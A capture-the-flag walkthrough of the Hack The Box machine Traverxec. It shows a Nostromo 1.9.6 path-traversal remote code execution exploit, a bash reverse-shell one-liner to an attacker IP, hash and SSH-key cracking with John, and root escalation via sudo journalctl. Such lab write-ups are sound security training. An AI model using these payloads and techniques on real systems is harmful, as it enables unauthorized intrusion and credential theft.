# Exercise: Enumeration and privilege escalation on  Traverxec

An nmap scan shows that ports 22 and 80 are open:

```bash
22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 
    (protocol 2.0)
…
80/tcp open http nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: 
    FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods:
|_ Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The web server is Nostromo version 1.9.6. Looking at the exploit database we find a number of potential vulnerabilities with this version. Before looking at the exploits however, we should look at the website itself.

Going to the home page, we find a site of David White who is a web designer.

![Home page of Traverexec](../.gitbook/assets/traverexec1.png)

Looking at the web page, there is little functionality enabled and so we can go back to the vulnerabilities of the webserver Nostromo. If we do a searchsploit of nostromo, we find the following:

```bash
┌─[rin@parrot]─[~/boxes/Traverexec]
└──╼ $searchsploit nostromo
Exploit Title Path
Nostromo - Directory Traversal Remote Command Execution 
    (Metasploit) | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution | multiple/remote/
    47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote 
    Command Execution | linux/remote/35466.sh
```

The vulnerability is CVE-2019-16278 and is an unauthenticated remote code execution exploit due to the website allowing path traversal. If we look at the Python code by making a local copy of the file:

```bash
┌─[oztechmuse@parrot]─[~/boxes/Traverexec]
└──╼ $searchsploit -m multiple/remote/47837.py
Exploit: nostromo 1.9.6 - Remote Code Execution
URL: 
https://www.exploit-db.com/exploits/47837

Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
File Type: Python script, ASCII text executable, 
    with CRLF line terminators
Copied to: /home/oztechmuse/boxes/Traverexec/47837.py
```

The key part of the code that runs the exploit is the method cve:

```python
def cve(target, port, cmd):
  soc = socket.socket()
  soc.connect((target, int(port)))
  payload = 'POST /.%0d./.%0d./.%0d./.%0d./'
  payload += 'bin/sh HTTP/1.0\r\nContent-Length: '
  payload += '1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
  soc.send(payload)
  receive = connect(soc)
  print(receive)
```

In this method, the script is doing an HTTP POST to a path that is "/.%0d./.%0d./.%0d./.%0d./bin/sh". The Nostromo code checks for paths in the URL but because of the addition of the carriage return character %0d, it does not think that this is a path. The %0d is removed by a later function making the path "/../../../../bin/sh" and this is then executed with the body of the POST as the argument.

We can use this script to run the same bash reverse shell we ran in Traceback after setting up a netcat listener \(note that you may have to change the code slightly to get it to run with Python 3, encoding the payload: soc.send\(payload.encode\(\)\):

```bash
python3 47837.py 10.129.1.193 80 \
"bash -c 'bash -i >& /dev/tcp/10.10.14.117/6001 0>&1'"
```

We then get a reverse sehll on the box:

```bash
┌─[rin@parrot]─[~]
└──╼ $nc -lvnp 6001
listening on [any] 6001 ...
connect to [10.10.14.117] from (UNKNOWN) [10.129.1.193] 51660
bash: cannot set terminal process group (640): 
    Inappropriate ioctl for device
bash: no job control in this shell
www-data@traverxec:/usr/bin$ whoami
whoami
www-data
```

Now that we are on the box, we can run LinPEAS by getting it using our local Python web server. The machine is running Debian Buster and there are two users with login, root and david. The key thing LinPEAS finds is a password hash that is stored in a .htpasswd file:

```bash
[i] 
https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data

-rw-r--r-- 1 root root 1994 Apr 18 2019 /etc/bash.bashrc
-rw-r--r-- 1 root root 3526 Apr 18 2019 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Apr 18 2019 /etc/skel/.profile
-rw-r--r-- 1 root root 570 Jan 31 2010 /usr/share/base-files
    /dot.bashrc
-rw-r--r-- 1 root root 2778 Jun 26 2016 /usr/share/doc/
    adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Jun 26 2016 /usr/share/doc/
    adduser/examples/adduser.local.conf.examples/skel/
    dot.bashrc
-rw-r--r-- 1 root bin 41 Oct 25 2019 /var/nostromo/conf/
    .htpasswd
Reading /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

We can try and crack the hash with John The Ripper. John detects that the hash is md5crypt and cracks the password as Nowonly4me:

```bash
┌─[rin@parrot]─[~/boxes/Traverexec]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt \
    hash.txt
Warning: detected hash type "md5crypt", but the string 
    is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force 
    loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ 
    (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key 
    for status
Nowonly4me (?)
<SNIP>
```

If we go into the /var/Nostromo/conf directory, we can see that there is a configuration file for Nostromo nhttpd.conf, which when we examine, has declared support for home directories:

```text
# HOMEDIRS [OPTIONAL]
homedirs /home
homedirs_public public_www
```

This allows support for people running personal web pages which are of the URL format [http://traverexec.htb/~user/](http://traverexec.htb/~user/). We know that there are two users, root and david. For root, we get a 404 but for david we get a page shown here:

![Home page of user david at http://traverexec.htb/~david/](../.gitbook/assets/traverexec2.png)



When we try and list the contents of /home/david, we get Permission denied as we have execute but not read permission:

```bash
www-data@traverxec:/home$ ls -al
total 12
drwxr-xr-x 3 root root 4096 Oct 25 2019 .
drwxr-xr-x 18 root root 4096 Oct 25 2019 ..
drwx--x--x 5 david david 4096 Oct 25 2019 david
```

From the Nostromo configuration file, we know that the web page for a home directory is in the directory public\_www so we can enter that directory and list the contents:

```bash
www-data@traverxec:/home$ cd david/public_www
www-data@traverxec:/home/david/public_www$ ls -al
total 16
drwxr-xr-x 3 david david 4096 Oct 25 2019 .
drwx--x--x 5 david david 4096 Oct 25 2019 ..
-rw-r--r-- 1 david david 402 Oct 25 2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25 2019 protected-file
```

Looking at the directory ./protected-file-area we find an .htaccess file and a file called backup-ssh-identity-files.tgz

```bash
www-data@traverxec:/home/david/public_www/
    protected-file-area$ ls -al
total 16
drwxr-xr-x 2 david david 4096 Oct 25 2019 .
drwxr-xr-x 3 david david 4096 Oct 25 2019 ..
-rw-r--r-- 1 david david 45 Oct 25 2019 .htaccess
-rw-r--r-- 1 david david ... backup-ssh-identity-files.tgz
```

Looking at the .htaccess file, we get the contents

```bash
www-data@traverxec:/home/david/public_www/
    protected-file-area$ cat .htaccess
realm David's Protected File Area. Keep out!
```

The .htaccess file is a simple way of restricting access to a directory and require basic authentication of a user on the box. When we try and go to the URL [http://traverexec.htb/~david/protected-file-area/](http://traverexec.htb/~david/protected-file-area/) we get presented with the dialog box  and can use the david as the username and Nowonly4me as the password.

![Basic authentication dialog box when navigating to http://traverexec.htb/~david/protected-file-area](../.gitbook/assets/6%20%282%29.png)

Once we get through the dialog, we get the contents of the directory listed. We can download the file by right clicking and saving the link.

![Contents of http://traverexec.htb/~david/protected-file-area](../.gitbook/assets/traverexec3.png)

The file is in a compressed tar format and we can expand the contents using:

```bash
┌─[rin@parrot]─[~/boxes/Traverexec/files]
└──╼ $tar xvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

Going into the directory ./home/david/.ssh and looking at the id\_rsa key file, we see that it is encrypted

```bash
┌─[rin@parrot]─[~/boxes/Traverexec/files/home/david/.ssh]
└──╼ $cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F
<SNIP>
-----END RSA PRIVATE KEY-----
```

And sure enough, when we try and use it to SSH using the user david, we get prompted for a password. The password we used for the web page doesn't work however. Nor does it work when using it as david's actual login password. We can try and crack the id\_rsa key by using ssh2john.py which will extract a password hash from the SSH key in a format that John understands:

```bash
┌─[✗]─[rin@parrot]─[~/boxes/Traverexec/files/home/david/.ssh]
└──╼ $python2 /usr/share/john/ssh2john.py id_rsa > hash.txt
```

Again, we can then crack this with John The Ripper:

```bash
┌─[rin@parrot]─[~/boxes/Traverexec/files/home/david/.ssh]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt \
    hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH 
    (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) 
    is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it 
    will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key 
    for status
hunter (id_rsa)
```

When we try and SSH now and use the password hunter, we get in!

```bash
┌─[rin@parrot]─[~/boxes/Traverexec/files/home/david/.ssh]
└──╼ $ssh -i ./id_rsa david@traverexec.htb
Enter passphrase for key './id_rsa':
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2
    +deb10u1 (2019-09-20) x86_64
Last login: Tue Dec 29 07:54:43 2020 from 10.10.14.117
david@traverxec:~$
```

As a starting point of our enumeration, it is always a good idea to start with the home directory and if we list david's directory, we get

```bash
david@traverxec:~$ ls -al
total 36
drwx--x--x 5 david david 4096 Oct 25 2019 .
drwxr-xr-x 3 root root 4096 Oct 25 2019 ..
lrwxrwxrwx 1 root root 9 Oct 25 2019 .bash_history -> 
    /dev/null
-rw-r--r-- 1 david david 220 Oct 25 2019 .bash_logout
-rw-r--r-- 1 david david 3526 Oct 25 2019 .bashrc
drwx------ 2 david david 4096 Oct 25 2019 bin
-rw-r--r-- 1 david david 807 Oct 25 2019 .profile
drwxr-xr-x 3 david david 4096 Oct 25 2019 public_www
drwx------ 2 david david 4096 Oct 25 2019 .ssh
-r--r----- 1 root david 33 Oct 25 2019 user.txt
```

The .bash\_history is a symbolically linked file to /dev/null which is a special file that discards any content written to it. This is done on Hack The Box so that there is no persistent history of the user's commands. There is the the .ssh directory and the public\_www directory we have already looked at but there is a new directory ./bin. The directory has two files; server-stats.head and server-stats.sh with the following content:

```bash
david@traverxec:~/bin$ ls -al
total 16
drwx------ 2 david david 4096 Oct 25 2019 .
drwx--x--x 5 david david 4096 Oct 25 2019 ..
-r-------- 1 david david 802 Oct 25 2019 server-stats.head
-rwx------ 1 david david 363 Oct 25 2019 server-stats.sh
david@traverxec:~/bin$ cat server-stats.head
                                                     .----.
                                         .---------. | == |
Webserver Statistics and Data            |.-"""""-.| |----|
Collection Script                        ||       || | == |
(c) David, 2019                          ||       || |----|
                                         |'-.....-'| |::::|
                                         '"")---(""' |___.|
                                        /:::::::::::\"    "
                                       /:::=======:::\
                                   jgs '"""""""""""""'

david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash
cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 \"
echo " | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find \"
echo "/var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | \
 /usr/bin/cat
david@traverxec:~/bin$
```

The interesting part of this is the sudo command running the program journalctl. This is a program that interacts with journald a daemon \(service\) that manages the journals \(logs\) generated by systemd on a Linux system. The script is displaying the contents of server-stats.head, then doing the "uptime" command which shows the current time, how long the system has been running and the number of users logged onto the system. The ss command will list the open sockets connected to the web server on port 80 and then count the number of lines in the output using wc -l. Finally, the sudo command is running journalctl which is listing the last 5 entries of the logs for the web server nostromo.service.

Since we can run journalctl using sudo, we can look at GTFObins and find that journalctl uses less when the content is longer than a single page. Less is a program on Linux that will break content into pages and allows vi commands to search for content as well as dropping into an interactive shell with !/bin/sh command. Journalctl does not drop the sudo privileges when running less and so it is possible to drop to an elevated shell very simply by running:

```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl \
 -n5 -unostromo.service
-- Logs begin at Mon 2020-12-28 EST, end at Tue 2020-12-29 
Dec 29 07:15:25 traverxec crontab[2738]: (www-data) 
 LIST (www-data)
Dec 29 07:17:38 traverxec sudo[8915]: pam_unix(sudo:auth): 
 authentication failure; logname= uid=33 euid=0 
  tty=/dev/pts/0 ruser=www-data rhost= user=w
Dec 29 07:17:40 traverxec sudo[8915]: pam_unix(sudo:auth): 
 conversation failed
Dec 29 07:17:40 traverxec sudo[8915]: pam_unix(sudo:auth): 
 auth could not identify password for [www-data]
Dec 29 07:17:40 traverxec sudo[8915]: www-data : 
 command not allowed ; TTY=pts/0 ; PWD=/dev/shm ; 
 USER=root ; COMMAND=list
!/bin/sh
# whoami
root
```

